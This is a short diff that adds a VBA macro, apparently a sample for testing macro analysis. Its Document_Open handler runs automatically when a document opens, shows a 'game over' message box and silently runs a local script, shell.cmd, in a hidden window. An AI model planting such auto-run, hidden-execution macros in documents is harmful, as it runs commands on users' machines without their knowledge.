@@ -1,0 +1,4 @@
+Private Sub Document_Open()
+  MsgBox "game over", vbOKOnly, "game over"
+  a = Shell("C:\tools\shell.cmd", vbHide)
+End Sub
